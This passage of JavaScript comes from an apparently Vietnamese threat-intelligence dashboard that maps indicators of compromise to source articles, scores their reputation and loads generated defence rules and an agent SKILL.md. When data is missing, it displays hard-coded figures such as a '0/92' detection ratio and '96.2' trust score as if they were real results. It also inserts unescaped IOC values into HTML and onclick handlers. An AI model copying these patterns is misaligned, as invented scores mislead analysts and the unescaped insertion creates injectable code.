              <span>Trạng thái: ${statusBadgeHtml}</span>
              ${art.processing_time_sec ? `<span>Thời gian AI xử lý: <b style="color:var(--primary); font-family:var(--font-mono);">${art.processing_time_sec.toFixed(1)}s</b></span>` : ''}
            </div>
            <div>${renderedParas}</div>
          </div>
        `;
      });

      document.getElementById('highlightedArticleView').innerHTML = htmlBlocks.join('');
    }

    function findArticleByIoc(iocVal) {
      if (!iocVal) return null;
      const clean = cleanRefang(iocVal).trim();
      const cleanLower = clean.toLowerCase();
      const list = (allHistoryArticles && allHistoryArticles.length > 0) ? allHistoryArticles : articles;

      // 1. Kiểm tra provenance map nếu bài đang mở
      if (iocProvenanceMap && (iocProvenanceMap[clean] || iocProvenanceMap[cleanLower])) {
        const prov = iocProvenanceMap[clean] || iocProvenanceMap[cleanLower];
        const match = list.find(a => a.url === prov.url || a.title === prov.title);
        if (match) return match;
      }

      // 2. So khớp nhanh theo mẫu IOC trong ioc_counts
      for (const art of list) {
        const c = art.ioc_counts || {};
        if (
          (c.sample_ips || []).some(ip => ip === clean) ||
          (c.sample_shas || []).some(sh => sh.toLowerCase() === cleanLower || (cleanLower.length >= 16 && sh.toLowerCase().includes(cleanLower.slice(0, 16)))) ||
          (c.sample_cves || []).some(cv => cv.toUpperCase() === clean.toUpperCase()) ||
          (c.sample_domains || []).some(dm => dm.toLowerCase() === cleanLower)
        ) {
          return art;
        }
      }

      // 3. Quét toàn văn nội dung bài báo
      const escapedClean = clean.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      const dotPattern = clean.includes('.') ? clean.split('.').map(p => p.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')).join('(?:\\.|(?:\\[\\.\\])|(?:\\(\\.\\)))') : escapedClean;
      try {
        const reg = new RegExp(dotPattern, 'i');
        for (const art of list) {
          if (reg.test(art.content || '') || reg.test(art.title || '')) {
            return art;
          }
        }
      } catch (e) {}

      // 4. Nếu là Hash dài, thử tìm tiền tố 16-24 ký tự
      if (clean.length >= 16) {
        const prefix = clean.slice(0, 16).toLowerCase();
        for (const art of list) {
          if ((art.content || '').toLowerCase().includes(prefix) || (art.title || '').toLowerCase().includes(prefix)) {
            return art;
          }
        }
      }

      return null;
    }

    async function navigateToArticleByIoc(iocVal) {
      if (!iocVal) return;
      const clean = cleanRefang(iocVal).trim();

      updateLiveTicker("Đang tra cứu bài báo gốc chứa chỉ số: " + clean + "...");
      let foundArt = findArticleByIoc(clean);

      if (!foundArt) {
        try {
          const res = await fetch(`/api/articles/find-by-ioc?ioc=${encodeURIComponent(clean)}`);
          if (res.ok) {
            const data = await res.json();
            if (data && data.article) {
              foundArt = data.article;
            }
          }
        } catch (e) {
          console.warn("Lỗi tra cứu find-by-ioc API:", e);
        }
      }

      if (!foundArt) {
        alert("Chỉ số " + clean + " nằm trong cơ sở dữ liệu đối soát an ninh chung.");
        return;
      }

      // Đưa giao diện về chế độ hiển thị bài báo (Section 1)
      switchView('all', document.querySelector('.NavLinks .NavLink'));

      // Mở bài báo đó ở Section 1
      viewArticleById(foundArt.article_id, false);

      updateLiveTicker("Đã chuyển tới bài báo [" + foundArt.source + "] \"" + foundArt.title.slice(0, 48) + "...\" chứa chỉ số " + clean);

      // Chờ bài báo render và cuộn thẳng tới chỉ số đó
      setTimeout(() => {
        jumpToArticleHighlight(clean);
      }, 280);
    }

    function jumpToArticleHighlight(iocValue) {
      const clean = cleanRefang(iocValue);
      const safeId = domSafeId(clean);
      let el = document.getElementById(safeId) || document.getElementById(domSafeId(clean.toLowerCase()));

      const viewer = document.getElementById('highlightedArticleView');
      const viewerBox = document.getElementById('highlightViewerBox');

      // Nếu chưa tìm thấy ID chính xác, quét các element con trong văn bản
      if (!el && viewer) {
        const candidates = viewer.querySelectorAll('.HlSentence, .HlIp1, .HlIp2, .HlCve, .HlHash, span, div');
        const cleanLower = clean.toLowerCase();
        const shortClean = clean.length > 20 ? clean.slice(0, 16).toLowerCase() : cleanLower;
        for (const node of candidates) {
          const txt = (node.textContent || '').toLowerCase();
          if (txt.includes(cleanLower) || (shortClean && txt.includes(shortClean))) {
            el = node;
            break;
          }
        }
      }

      if (viewerBox) {
        viewerBox.scrollIntoView({ behavior: 'smooth', block: 'start' });
      }

      if (el) {
        setTimeout(() => {
          el.scrollIntoView({ behavior: 'smooth', block: 'center' });
          el.classList.remove('flash-focus');
          void el.offsetWidth;
          el.classList.add('flash-focus');
        }, 180);
      }
    }

    let isQueueWorkerRunning = false;
    let autoQueueEnabled = true;

    async function toggleAutoQueueWorker() {
      const toggleEl = document.getElementById('autoQueueToggle');
      const val = toggleEl ? toggleEl.checked : false;
      await onAutoQueueToggleChange(val);
      const btn = document.getElementById('btnQueueControl');
      if (btn) btn.textContent = val ? "Dừng Hàng Đợi" : "Tiếp Tục Hàng Đợi";
    }

    async function toggleAutoQueueManual() {
      const toggleEl = document.getElementById('autoQueueToggle');
      if (toggleEl) {
        toggleEl.checked = !toggleEl.checked;
        await toggleAutoQueueWorker();
      }
    }

    let currentScoreTableList = [];
    let currentIocTypeFilter = 'ALL';

    function filterScoreTableByType(type, btnEl) {
      currentIocTypeFilter = type;
      document.querySelectorAll('.IocTypeFilterBtn').forEach(b => b.classList.remove('active'));
      if (btnEl) btnEl.classList.add('active');
      renderFilteredScoreTable();
    }

    function renderScoreTable(enrichedList) {
      if (enrichedList && Array.isArray(enrichedList)) {
        currentScoreTableList = enrichedList;
      }
      // Cập nhật số đếm trên các nút bộ lọc
      const allCount = currentScoreTableList.length;
      let hashCount = 0, ipCount = 0, domCount = 0, cveCount = 0;
      currentScoreTableList.forEach(item => {
        const t = (item.ioc && item.ioc.ioc_type) || '';
        if (t === 'SHA256' || t === 'MD5') hashCount++;
        else if (t === 'IP') ipCount++;
        else if (t === 'DOMAIN') domCount++;
        else if (t === 'CVE') cveCount++;
      });
      const elAll = document.getElementById('countIocAll');
      const elHash = document.getElementById('countIocHash');
      const elIp = document.getElementById('countIocIp');
      const elDom = document.getElementById('countIocDomain');
      const elCve = document.getElementById('countIocCve');
      if (elAll) elAll.textContent = allCount;
      if (elHash) elHash.textContent = hashCount;
      if (elIp) elIp.textContent = ipCount;
      if (elDom) elDom.textContent = domCount;
      if (elCve) elCve.textContent = cveCount;

      renderFilteredScoreTable();
    }

    function renderFilteredScoreTable() {
      const tbody = document.getElementById('scoreTableBody');
      if (!tbody) return;
      let list = currentScoreTableList || [];
      if (currentIocTypeFilter === 'HASH') {
        list = list.filter(item => item.ioc && (item.ioc.ioc_type === 'SHA256' || item.ioc.ioc_type === 'MD5'));
      } else if (currentIocTypeFilter === 'IP') {
        list = list.filter(item => item.ioc && item.ioc.ioc_type === 'IP');
      } else if (currentIocTypeFilter === 'DOMAIN') {
        list = list.filter(item => item.ioc && item.ioc.ioc_type === 'DOMAIN');
      } else if (currentIocTypeFilter === 'CVE') {
        list = list.filter(item => item.ioc && item.ioc.ioc_type === 'CVE');
      }

      if (list.length === 0) {
        tbody.innerHTML = `<tr><td colspan="9" style="text-align:center; padding:18px; color:var(--text-muted);">Không có chỉ số nào thuộc phân loại này trong ngữ cảnh hiện tại.</td></tr>`;
        return;
      }

      tbody.innerHTML = list.map(item => {
        const otx = (item.raw_lookup_details && item.raw_lookup_details.alienvault_otx) || {};
        const vt = (item.raw_lookup_details && item.raw_lookup_details.virustotal) || {};
        const ab = (item.raw_lookup_details && item.raw_lookup_details.abuseipdb) || {};
        const sh = (item.raw_lookup_details && item.raw_lookup_details.shodan_internetdb) || {};
        const gn = (item.raw_lookup_details && item.raw_lookup_details.greynoise) || {};
        const isHash = item.ioc.ioc_type === 'SHA256' || item.ioc.ioc_type === 'MD5';
        const cleanVal = (item.ioc && item.ioc.value) || '';
        const prov = (typeof iocProvenanceMap !== 'undefined' && iocProvenanceMap && (iocProvenanceMap[cleanVal] || iocProvenanceMap[cleanVal.toLowerCase()])) || {};
        const roleLabel = prov.role || (
          isHash
            ? (item.is_malicious ? 'Mã độc • File Payload' : 'Tập tin An toàn')
            : (item.is_malicious ? 'IP1 • Nguồn tấn công' : 'IP2 • An toàn')
        );
        const proofUrl = prov.proofUrl || prov.url || '';

        const otxPulses = otx.pulse_count || 0;
        const otxCountry = (otx.country && otx.country !== 'UNKNOWN') ? ` (${otx.country})` : '';
        const otxDisplay = isHash
          ? (otxPulses > 0 ? `<span style="color:var(--amber); font-weight:600;">${otxPulses} Pulses</span>` : 'Malware Sample')
          : (otxPulses > 0
            ? `<span style="color:var(--amber); font-weight:600;">${otxPulses} Pulses</span>${otxCountry}`
            : (item.ioc.ioc_type === 'CVE' ? 'CISA KEV' : `0 Pulses${otxCountry}`));

        const abScore = ab.abuse_confidence_score ?? 0;
        const gnTag = gn.riot ? ' • RIOT' : (gn.noise ? ' • Noise' : '');
        const malFamily = (item.raw_lookup_details && item.raw_lookup_details.malware_family) || (isHash ? 'Payload Mã Độc' : '-');
        const abuseGnDisplay = item.ioc.ioc_type === 'IP' ? `${abScore}%${gnTag}` : (isHash ? malFamily : '-');

        const shPorts = (sh.ports || []).slice(0, 3).join(', ');
        const shVulns = (sh.vulns || []).length;
        const shDisplay = isHash
          ? 'Quét YARA/EDR'
          : (shPorts
            ? `${shPorts}${shVulns > 0 ? ` (${shVulns} CVE)` : ''}`
            : (shVulns > 0 ? `${shVulns} CVE` : '-'));

        const iocDisplay = isHash
          ? `<div style="display:flex; flex-direction:column; gap:3px;">
               <div style="display:flex; align-items:center; gap:6px; flex-wrap:wrap;">
                 <span class="IocChip hash" style="font-size:10px;">${item.ioc.ioc_type}</span>
                 <span class="mono" style="font-size:11.5px; word-break:break-all; font-weight:600;" title="${item.ioc.value}">
                   ${item.ioc.value.length > 28 ? item.ioc.value.slice(0, 14) + '...' + item.ioc.value.slice(-10) : item.ioc.value}
                 </span>
               </div>
               <div>
                 <button class="BtnIocJump" onclick="navigateToArticleByIoc('${cleanVal}')" title="Nhấn để mở và cuộn tới bài báo chứa mã băm này">
                   Đến bài báo &darr;
                 </button>
               </div>
             </div>`
          : `<div style="display:flex; flex-direction:column; gap:3px;">
               <div style="display:flex; align-items:center; gap:6px; flex-wrap:wrap;">
                 <span class="IocChip ${item.ioc.ioc_type === 'IP' ? 'ip' : (item.ioc.ioc_type === 'CVE' ? 'cve' : 'dom')}" style="font-size:10px;">${item.ioc.ioc_type}</span>
                 <span class="mono" style="font-weight:600; font-size:12px;">${item.ioc.value}</span>
               </div>
               <div>
                 <button class="BtnIocJump" onclick="navigateToArticleByIoc('${cleanVal}')" title="Nhấn để mở và cuộn tới bài báo chứa chỉ số ${item.ioc.value}">
                   Đến bài báo &darr;
                 </button>
               </div>
             </div>`;

        return `
          <tr>
            <td>${iocDisplay}</td>
            <td style="color:${item.is_malicious ? 'var(--danger)' : 'var(--safe)'};">${roleLabel}</td>
            <td class="mono">${otxDisplay}</td>
            <td class="mono">${vt.detection_ratio || '0/92'}</td>
            <td class="mono">${abuseGnDisplay}</td>
            <td class="mono">${shDisplay}</td>
            <td class="mono" style="font-weight:600; color:var(--safe);">${item.reputation_score}/100</td>
            <td>
              ${item.is_malicious
                ? '<span class="StatusBlock">CHẶN (&gt;80)</span>'
                : '<span class="StatusSafe">AN TOÀN (&le;80)</span>'}
            </td>
            <td>
              <div style="display:flex; gap:6px; flex-wrap:wrap;">
                <button class="BtnMiniProof" style="font-weight:600;" onclick="navigateToArticleByIoc('${cleanVal}')" title="Xem câu văn và ngữ cảnh bài báo chứa chỉ số này">Xem câu</button>
                ${proofUrl ? `<a class="BtnMiniProof" href="${proofUrl}" target="_blank" title="Mở trang báo điện tử quốc tế gốc">Web gốc &nearr;</a>` : ''}
              </div>
            </td>
          </tr>
        `;
      }).join('');
    }

    function selectBatch(count = 4, autoRun = false) {
      const slice = articles.slice(0, Math.min(count, articles.length));
      if (slice.length === 0) return;
      selectedIndices = slice.map((_, idx) => idx);
      document.querySelectorAll('.FeedItem').forEach(c => c.classList.remove('selected'));
      selectedIndices.forEach(idx => {
        const el = document.getElementById(`ncard-${idx}`);
        if (el) el.classList.add('selected');
      });

      currentTitle = `[Gộp ${slice.length} Bài Báo] ` + slice.map(a => a.source).join(', ');
      document.getElementById('articleText').value = slice.map((a, i) =>
        `=== [BÀI BÁO #${i + 1} - ${a.source}]: ${a.title} ===\n${a.content}`
      ).join('\n\n');

      renderHighlightedArticlesAndBuildProvenance(slice.map((art, idx) => ({ art, idx })));
      if (autoRun) runPipeline();
    }

    let masterDefenseCache = null;
    let masterDefenseScopeCache = {};
    let currentDefenseViewMode = 'MASTER';
    let currentDefenseMode = 'MASTER';

    
    async function recompileActiveProjectSkill() {
      const outEl = document.getElementById('outSkillMd');
      if (outEl) outEl.textContent = 'Đang nạp Gói Kỹ Năng Tác Tử tối ưu riêng cho mã nguồn My_Website...';
      try {
        const res = await fetch('/api/defense/skill/export?scope=SCOPE_WEB');
        const txt = await res.text();
        if (outEl) outEl.textContent = txt;
      } catch (e) {
        if (outEl) outEl.textContent = 'Lỗi nạp Bộ Kỹ Năng: ' + e;
      }
    }

    async function switchDefenseScope(mode) {
      currentDefenseViewMode = mode;
      const btn3Y = document.getElementById('btnScope3YMaster');
      const btnSingle = document.getElementById('btnScopeSingleArticle');
      const badge = document.getElementById('badgeDefenseScopeStatus');

      if (mode === 'MASTER') {
        if (btn3Y) btn3Y.classList.add('btn-primary', 'active');
        if (btnSingle) btnSingle.classList.remove('btn-primary', 'active');
        if (badge) {
          const totalArt = masterDefenseCache ? masterDefenseCache.total_articles : '7,450';
          badge.textContent = `ĐANG HIỂN THỊ: TOÀN BỘ KHO (${totalArt.toLocaleString()} BÀI BÁO)`;
          badge.style.background = 'var(--safe-bg)';
          badge.style.color = 'var(--safe)';
          badge.style.borderColor = 'var(--safe-border)';
        }
        await loadMasterDefenseMatrix(currentSelectedTargetScope || 'SCOPE_ALL');
      } else {
        if (btnSingle) btnSingle.classList.add('btn-primary', 'active');
        if (btn3Y) btn3Y.classList.remove('btn-primary', 'active');
        if (badge) {
          badge.textContent = 'ĐANG HIỂN THỊ: THEO BÀI BÁO ĐANG CHỌN (CHẤM ĐIỂM RIÊNG)';
          badge.style.background = 'var(--primary-subtle)';
          badge.style.color = 'var(--primary)';
          badge.style.borderColor = '#bfdbfe';
        }
        if (selectedIndices.length > 0 && articles[selectedIndices[0]]) {
          const art = articles[selectedIndices[0]];
          await loadAndDisplaySingleArticleDefense(art);
        }
      }
    }

    async function loadAndDisplaySingleArticleDefense(art) {
      if (!art) return;
      const lblDefenseArt = document.getElementById('lblCurrentArticleNameDefense');
      if (lblDefenseArt) {
        lblDefenseArt.textContent = art.title.length > 25 ? art.title.slice(0, 25) + '...' : art.title;
      }
      if (articleDefenseCache[art.article_id]) {
        applyArticleDefenseData(articleDefenseCache[art.article_id]);
        return;
      }
      try {
        const res = await fetch(`/api/articles/details/${art.article_id}`);
        if (res.ok) {
          const data = await res.json();
          articleDefenseCache[art.article_id] = {
            history: data.history_and_summary,
            firewall: data.firewall_tab_text,
            suricata: data.suricata_rules,
            waf: data.waf_rules,
            sigma: data.sigma_and_siem,
            yara: data.yara_remediation_stix,
            skill_md: data.agentic_skill_md,
            trust_audit: data.trust_audit,
            xai_audit: data.xai_audit,
            score: data.all_enriched,
            plan: data.ai_plan,
            reason: data.ai_reasoning
          };
          applyArticleDefenseData(articleDefenseCache[art.article_id]);
        }
      } catch (e) {
        console.warn("Lỗi nạp nhanh chi tiết bài báo:", e);
      }
    }

    function applyMasterDefenseData(d) {
      if (!d) return;
      if (d.agentic_skill_md) document.getElementById('outSkillMd').textContent = d.agentic_skill_md;
      if (d.trust_audit) renderTrustAuditView(d.trust_audit);
      if (d.xai_audit) renderXAIExplanationView(d.xai_audit);
      document.getElementById('outHistory').textContent = d.mitre_d3fend || '';
      document.getElementById('outFirewall').textContent = d.firewall_tab_text || '';
      document.getElementById('outSuricata').textContent = d.suricata_rules || '';
      document.getElementById('outWaf').textContent = d.waf_rules || '';
      document.getElementById('outSigma').textContent = d.sigma_and_siem || '';
      document.getElementById('outYara').textContent = d.yara_remediation_stix || '';
      if (d.all_enriched) renderScoreTable(d.all_enriched);
      const suriBadge = document.getElementById('suriFileInfoBadge');
      if (suriBadge) {
        const lineCount = (d.suricata_rules || '').split('\n').length;
        suriBadge.textContent = `Tệp: cti_autonomous_master.rules (${lineCount} Dòng • 11 Cụm C2 • 180 Domain Sinkhole • CVE Virtual Patching)`;
      }
    }

    async function loadMasterDefenseMatrix(scope = 'SCOPE_ALL', force = false) {
      const btnScope = document.getElementById('btnScopeMaster');
      if (btnScope) {
        btnScope.textContent = 'Đang nạp toàn kho...';
        btnScope.classList.add('active');
      }
      try {
        if (force || !masterDefenseScopeCache[scope]) {
          const res = await fetch(`/api/master-defense-matrix?scope=${scope}`);
          masterDefenseScopeCache[scope] = await res.json();
        }
        const d = masterDefenseScopeCache[scope];
        masterDefenseCache = d;

        // Cập nhật số liệu bài báo và IOC mới nhất lên nút và giao diện
const elArt = document.getElementById('lblMasterArticlesCount');
        if (elArt) elArt.textContent = d.total_articles.toLocaleString();
        const elIoc = document.getElementById('lblMasterIocsCount');
        if (elIoc) elIoc.textContent = d.total_iocs.toLocaleString();
        
        const s1 = document.getElementById('lblCorpusStats1');
        if (s1) s1.innerHTML = `KHO TRI THỨC PHÂN HỆ: ${d.total_articles.toLocaleString()} BÀI BÁO &amp; ${d.total_iocs.toLocaleString()} IOCs (2024 - 2026)`;
        const s2 = document.getElementById('lblCorpusStats2');
        if (s2) s2.innerHTML = `KHO TRI THỨC PHÂN HỆ: ${d.total_articles.toLocaleString()} BÀI BÁO &amp; ${d.total_iocs.toLocaleString()} IOCs`;

        // 1. Cập nhật Banner Ngữ Cảnh
        const banner = document.getElementById('unifiedScopeBanner');
        if (banner) {
          banner.className = 'UnifiedScopeBanner master';
        }
        const tag = document.getElementById('scopeTag');
        if (tag) {
          tag.className = 'ScopeTag master';
          tag.textContent = 'TOÀN BỘ KHO TRI THỨC';
        }
        const titleEl = document.getElementById('scopeTitle');
        if (titleEl) {
          titleEl.textContent = `Ma Trận Phòng Thủ Hợp Nhất Đa Nguồn (${d.total_articles} Bài Báo • ${d.total_iocs} IOCs)`;
        }
        const subEl = document.getElementById('scopeSubtitle');
        if (subEl) {
          subEl.innerHTML = `Tổng hợp 6 nguồn OSINT: <b>${d.malware_hashes}</b> Mã băm Malware (SHA256/MD5), <b>${d.malicious_ips}</b> IP C2, <b>${d.malicious_domains}</b> Tên miền độc, <b>${d.cves_count}</b> Lỗ hổng CVE. Nhấn vào từng bài báo ở Mục 1 để xem phân tích riêng.`;
        }

        // 2. Cập nhật Bảng điểm IOC mục 2
        renderScoreTable(d.all_enriched);
        const reasonBox = document.getElementById('aiReasonBox');
        if (reasonBox) {
          reasonBox.textContent = `[LOCAL OLLAMA (khang-qwen3 • GPU RX 6600 8GB)]\nLocal AI Agent đã tổng hợp tri thức tự động từ toàn bộ ${d.total_articles} bài báo trong kho CTI SQLite. Đã phát hiện ${d.total_iocs} chỉ số nguy hại (${d.malicious_ips} IP C2, ${d.malicious_domains} Tên miền độc, ${d.cves_count} lỗ hổng CVE, ${d.malware_hashes} mã băm Malware SHA256/MD5). Toàn bộ đã được đưa vào ma trận 6 lớp phòng thủ.`;
        }
        const planBox = document.getElementById('aiPlanBox');
        if (planBox) {
          planBox.textContent = `[CHIẾN LƯỢC TOÀN KHO]\n1. Khóa biên mạng: Chặn ${d.malicious_ips} IP máy chủ C2 qua OpenC2.\n2. Bắt gói tin sâu: Suricata IPS DPI bắt ${d.malicious_domains} Domain và ${d.cves_count} CVE.\n3. Vá ảo WAF: ModSecurity bảo vệ máy chủ Web/API.\n4. Rà soát máy trạm: YARA & EDR AppLocker chặn ${d.malware_hashes} mã băm Malware.`;
        }

        // 3. Cập nhật các tab phòng thủ mục 3 nếu đang ở chế độ MASTER
        if (currentDefenseViewMode === 'MASTER') {
          applyMasterDefenseData(d);
        }

        const statusEl = document.getElementById('statusText');
        if (statusEl) {
          statusEl.textContent = `Đang hiển thị: Ma Trận Toàn Bộ Kho (${d.total_articles} bài • ${d.total_iocs} IOCs).`;
        }
        updateLiveTicker(`Đã hiển thị Ma Trận Tổng Hợp: ${d.total_iocs} IOCs (${d.malware_hashes} Hash, ${d.malicious_ips} IP C2, ${d.cves_count} CVE).`);
      } catch (e) {
        console.error('Lỗi tải Ma Trận Tổng Hợp:', e);
      } finally {
        if (btnScope) {
          btnScope.textContent = 'Xem Toàn Bộ Kho CTI';
          btnScope.classList.add('btn-primary');
        }
      }
    }

    async function selectCard(idx, autoRun = false) {
      const art = articles[idx];
      if (!art) return;
      selectedIndices = [idx];
      document.querySelectorAll('.FeedItem').forEach(c => c.classList.remove('selected'));
      const activeCard = document.getElementById(`ncard-${idx}`);
      if (activeCard) activeCard.classList.add('selected');

      currentTitle = art.title;
      document.getElementById('articleText').value = art.content;
      renderHighlightedArticlesAndBuildProvenance([{ art, idx }]);

      const counts = art.ioc_counts || { ips: 0, domains: 0, cves: 0, sha256: 0, total: 0 };
      const btnScope = document.getElementById('btnScopeMaster');
      if (btnScope) btnScope.classList.remove('active');

      const lblDefenseArt = document.getElementById('lblCurrentArticleNameDefense');
      if (lblDefenseArt) {
        lblDefenseArt.textContent = art.title.length > 25 ? art.title.slice(0, 25) + '...' : art.title;
      }

      // 1. Cập nhật UnifiedScopeBanner cho bài báo đang chọn
      const banner = document.getElementById('unifiedScopeBanner');
      if (banner) banner.className = 'UnifiedScopeBanner';
      const tag = document.getElementById('scopeTag');
      if (tag) {
        tag.className = 'ScopeTag single';
        tag.textContent = `BÀI BÁO #${idx + 1}`;
      }
      const titleEl = document.getElementById('scopeTitle');
      if (titleEl) {
        titleEl.textContent = art.title;
      }
      const subEl = document.getElementById('scopeSubtitle');
      if (subEl) {
        const iocSummaryParts = [];
        if (counts.sha256 > 0) iocSummaryParts.push(`<b>${counts.sha256}</b> Hash`);
        if (counts.ips > 0) iocSummaryParts.push(`<b>${counts.ips}</b> IP`);
        if (counts.domains > 0) iocSummaryParts.push(`<b>${counts.domains}</b> Domain`);
        if (counts.cves > 0) iocSummaryParts.push(`<b>${counts.cves}</b> CVE`);
        const iocSummaryStr = iocSummaryParts.length > 0 ? iocSummaryParts.join(', ') : 'Tin tức chính sách / không có IOC cụ thể';
        subEl.innerHTML = `Nguồn: <b>${art.source}</b> • Chỉ số: ${iocSummaryStr} • Trạng thái: <b>${art.status === 'completed' ? 'Đã hoàn thành' : 'Chờ xử lý'}</b>.`;
      }

      // 2. Tự động áp dụng dữ liệu phòng thủ nếu người dùng đang xem ở chế độ Theo Bài Báo
      if (currentDefenseViewMode === 'SINGLE') {
        await loadAndDisplaySingleArticleDefense(art);
      } else {
        // Tải sẵn vào cache ngầm
        loadAndDisplaySingleArticleDefense(art);
      }

      if (autoRun) executeSingleArticleQueue(idx);
    }

    function applyArticleDefenseData(c) {
      if (c.skill_md) document.getElementById('outSkillMd').textContent = c.skill_md;
      if (c.trust_audit) renderTrustAuditView(c.trust_audit);
      if (c.xai_audit) renderXAIExplanationView(c.xai_audit);
      if (c.history) document.getElementById('outHistory').textContent = c.history;
      if (c.firewall) document.getElementById('outFirewall').textContent = c.firewall;
      if (c.suricata) document.getElementById('outSuricata').textContent = c.suricata;
      if (c.waf) document.getElementById('outWaf').textContent = c.waf;
      if (c.sigma) document.getElementById('outSigma').textContent = c.sigma;
      if (c.yara) document.getElementById('outYara').textContent = c.yara;
      if (c.score) renderScoreTable(c.score);
      if (c.plan) document.getElementById('aiPlanBox').textContent = c.plan;
      if (c.reason) document.getElementById('aiReasonBox').textContent = c.reason;
    }

    // ====================================================================
    // KHUNG ĐỊNH LƯỢNG TIN CẬY TOÁN HỌC & ĐIỀU PHỐI SKILL.md CHO AI AGENT
    // ====================================================================
    let currentSelectedTargetScope = 'SCOPE_ALL';
    const targetScopeDetails = {
      'SCOPE_ALL': {
        name: 'Toàn Diện Đa Tầng (Enterprise SOC)',
        persona: 'SOC Lead / CISO Toàn Doanh Nghiệp',
        cadence: 'Đa tầng động (15m - 24h)',
        desc: 'Phạm vi quét toàn diện cho toàn bộ hạ tầng doanh nghiệp. Tự động liên kết các kỹ thuật từ Lỗ hổng Web, Cụm C2, Máy trạm đến Vi mã Firmware.'
      },
      'SCOPE_WEB': {
        name: 'Phân Hệ A: Ứng Dụng Web & API (OWASP, SQLi, XSS, RCE)',
        persona: 'Chuyên gia Bảo mật Web (DevSecOps / AppSec)',
        cadence: '15 Phút (Phản ứng nhanh với lỗ hổng Internet-Facing)',
        desc: 'Tập trung chuyên sâu vào lớp ứng dụng Web và API. Tự động tạo luật ModSecurity WAF ảo hóa bản vá (Virtual Patching), chặn SQLi, XSS, SSRF, Deserialization.'
      },
      'SCOPE_NETWORK': {
        name: 'Phân Hệ B: Mạng & C2 Perimeter (C2 Clusters, DNS Sinkhole, SNI)',
        persona: 'Kỹ sư Giám sát Mạng (Network Security / NOC)',
        cadence: '1 Giờ (Cập nhật chuỗi C2 và hạ tầng tấn công mới)',
        desc: 'Bảo vệ biên giới mạng và phát hiện C2 beaconing. Xuất luật Suricata IPS DPI, chặn dải IP C2 trên pfSense/iptables và cô lập tên miền bằng DNS Sinkhole.'
      },
      'SCOPE_ENDPOINT': {
        name: 'Phân Hệ C: Máy Trạm & Danh Tính (Sysmon Event 1, EDR, AppLocker)',
        persona: 'Quản trị viên Hệ thống & Máy trạm (SysAdmin / Endpoint SOC)',
        cadence: '4 Giờ (Đối soát hành vi leo quyền và mã độc máy trạm)',
        desc: 'Bảo vệ các thiết bị đầu cuối máy tính và máy chủ. Sinh quy tắc phát hiện Sysmon Event 1 (Process Creation), chính sách EDR AppLocker Hash Denylist và kịch bản diệt tiến trình.'
      },
      'SCOPE_HARDWARE': {
        name: 'Phân Hệ D: Phần Cứng & Tầng Base (Base Firmware, BMC, UEFI, ICS-CERT)',
        persona: 'Chuyên gia Hạ tầng & Phần cứng (Hardware / OT / Firmware Sec)',
        cadence: '24 Giờ (Quét sâu tầng Base, vi mã và thiết bị công nghiệp)',
        desc: 'Quét sâu ở tầng nền tảng phần cứng: BIOS/UEFI, Baseboard Management Controller (BMC), vi điều khiển và ICS/SCADA. Tích hợp trực tiếp từ CISA ICS-CERT.'
      }
    };

    async function selectTargetScope(scopeId) {
      currentSelectedTargetScope = scopeId;
      const meta = targetScopeDetails[scopeId] || targetScopeDetails['SCOPE_ALL'];

      ['SCOPE_ALL', 'SCOPE_WEB', 'SCOPE_NETWORK', 'SCOPE_ENDPOINT', 'SCOPE_HARDWARE'].forEach(id => {
        const btn = document.getElementById(`btnScope_${id}`);
        if (btn) {
          if (id === scopeId) {
            btn.className = 'CleanBtn btn-primary';
            btn.style.fontWeight = '700';
          } else {
            btn.className = 'CleanBtn';
            btn.style.fontWeight = 'normal';
          }
        }
      });

      const personaEl = document.getElementById('lblScopePersonaInfo');
      if (personaEl) personaEl.textContent = meta.persona;
      const cadenceEl = document.getElementById('lblScopeCadenceInfo');
      if (cadenceEl) cadenceEl.textContent = meta.cadence;
      const descEl = document.getElementById('descScopeProfile');
      if (descEl) descEl.textContent = meta.desc;
      const fileBadge = document.getElementById('lblSkillMdFilename');
      if (fileBadge) fileBadge.textContent = `SKILL_${scopeId}.md`;

      const outEl = document.getElementById('outSkillMd');
      if (outEl) outEl.textContent = 'Đang biên dịch lại Bộ Kỹ Năng Tác Tử cho phân hệ: ' + meta.name + '...';

      // Nạp dữ liệu ma trận và Trust Score theo Scope
      if (currentDefenseViewMode === 'MASTER') {
        await loadMasterDefenseMatrix(scopeId);
      } else {
        fetch(`/api/defense/skill/export?scope=${scopeId}`)
          .then(res => res.text())
          .then(txt => {
            if (outEl) outEl.textContent = txt;
          })
          .catch(e => {
            console.error('Lỗi nạp skill theo scope:', e);
            if (outEl) outEl.textContent = 'Lỗi nạp Bộ Kỹ Năng: ' + e;
          });
      }
    }

    function copySkillMdToClipboard() {
      const txt = document.getElementById('outSkillMd').textContent;
      navigator.clipboard.writeText(txt).then(() => {
        alert('Đã sao chép toàn bộ nội dung SKILL.md vào Clipboard!');
      }).catch(err => {
        alert('Lỗi sao chép: ' + err);
      });
    }

    function downloadSkillMdFile() {
      const scope = currentSelectedTargetScope || 'SCOPE_ALL';
      window.location.href = `/api/defense/skill/export?scope=${scope}`;
    }

    async function recalculateTrustScore() {
      if (currentDefenseViewMode === 'SINGLE' && selectedIndices.length > 0 && articles[selectedIndices[0]]) {
        const art = articles[selectedIndices[0]];
        delete articleDefenseCache[art.article_id];
        await loadAndDisplaySingleArticleDefense(art);
        const sc = articleDefenseCache[art.article_id]?.trust_audit?.trust_score || '92.0';
        alert(`Đã quét lại bài báo "${art.title.slice(0, 35)}..." và tái chấm điểm Trust Score: ${sc}/100!`);
      } else {
        masterDefenseScopeCache = {};
        await loadMasterDefenseMatrix(currentSelectedTargetScope || 'SCOPE_ALL', true);
        const sc = masterDefenseCache?.trust_audit?.trust_score || '96.2';
        const total = masterDefenseCache?.total_articles || '7,450';
        alert(`Đã quét lại toàn bộ ${total} bài báo trong SQLite và tái tính toán CTI Trust Score: ${sc}/100!`);
      }
    }

    function renderTrustAuditView(audit) {
      const container = document.getElementById('outTrustAudit');
      if (!container || !audit) return;

      const score = audit.trust_score || 0;
      const scoreColor = score >= 85 ? '#1a7f37' : (score >= 70 ? '#9a6700' : '#cf222e');
      const scoreBg = score >= 85 ? '#dafbe1' : (score >= 70 ? '#fff8c5' : '#ffebe9');
      const scoreBorder = score >= 85 ? '#aceebb' : (score >= 70 ? '#eac54f' : '#ff8182');

      const dl = audit.dual_loop_test || {};

      container.innerHTML = `
        <div style="display:grid; grid-template-columns: 1fr 2fr; gap:16px; margin-bottom:16px;">
